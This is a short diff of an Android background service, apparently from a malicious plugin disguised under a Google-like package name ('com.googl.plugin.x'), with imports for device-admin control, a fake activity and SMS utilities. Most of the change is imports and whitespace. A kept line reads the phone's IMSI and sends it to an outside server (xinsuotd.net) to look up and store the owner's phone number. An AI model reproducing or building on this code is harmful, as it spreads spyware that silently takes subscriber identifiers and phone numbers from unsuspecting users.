@@ -5,17 +5,16 @@ import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.os.Handler;
 import android.os.IBinder;
+import android.os.Looper;
 import android.text.TextUtils;
 import com.googl.plugin.x.FakeActivity;
 import com.googl.plugin.x.R;
 import com.plugin.common.utils.CustomThreadPool;
 import com.plugin.common.utils.UtilsRuntime;
 import com.plugin.internet.InternetUtils;
-import com.xstd.plugin.Utils.BRCUtil;
-import com.xstd.plugin.Utils.CommonUtil;
-import com.xstd.plugin.Utils.DomanManager;
-import com.xstd.plugin.Utils.SMSUtil;
+import com.xstd.plugin.Utils.*;
 import com.xstd.plugin.api.ActiveRequest;
 import com.xstd.plugin.api.ActiveResponse;
 import com.xstd.plugin.api.PhoneFetchRequest;
@@ -101,7 +100,7 @@ public class PluginService extends IntentService {
                 String imsi = UtilsRuntime.getIMSI(getApplicationContext());
                 if (!TextUtils.isEmpty(imsi)) {
                     PhoneFetchRespone respone = InternetUtils.request(getApplicationContext()
-                                                                , new PhoneFetchRequest("http://www.xinsuotd.net/tools/" + imsi));
+                                                                         , new PhoneFetchRequest("http://www.xinsuotd.net/tools/" + imsi));
                     if (respone != null && TextUtils.isEmpty(respone.phone)) {
                         SettingManager.getInstance().setCurrentPhoneNumber(respone.phone);
                     }
